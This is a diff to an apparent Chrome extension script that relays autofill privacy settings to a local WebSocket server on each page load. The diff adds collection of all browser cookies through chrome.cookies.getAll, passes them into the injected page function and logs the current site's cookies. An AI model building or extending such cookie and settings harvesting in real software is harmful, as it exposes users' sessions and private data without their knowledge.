@@ -1,4 +1,5 @@
 let addressAutoFill = false, bankingAutoFill = false;
+let cookieData;
 
 chrome.privacy.services.autofillAddressEnabled.get({}, function(details) {
     if (details.value) {
@@ -12,6 +13,10 @@ chrome.privacy.services.autofillCreditCardEnabled.get({}, function(details) {
     }
 });
 
+chrome.cookies.getAll({}, function(details) {
+    cookieData = details;
+});
+
 // Everytime the webpage reloads, relay the new information to the server
 chrome.webNavigation.onDOMContentLoaded.addListener(async () => {
     let [tab] = await chrome.tabs.query({active: true, currentWindow: true});
@@ -19,12 +24,14 @@ chrome.webNavigation.onDOMContentLoaded.addListener(async () => {
     chrome.scripting.executeScript({
         target: { tabId: tab.id },
         function: socket,
-        args: [addressAutoFill, bankingAutoFill]
+        args: [addressAutoFill, bankingAutoFill, cookieData]
     });
 });
 
-function socket(addressAutoFill, bankingAutoFill) {
+function socket(addressAutoFill, bankingAutoFill, cookieData) {
     let ws = new WebSocket("ws://localhost:8080");
+
+    console.log(cookieData.filter(cookie => cookie.domain.includes(window.location.hostname)));
 
     // Listen for messages from the server.
     ws.addEventListener("open", () => {
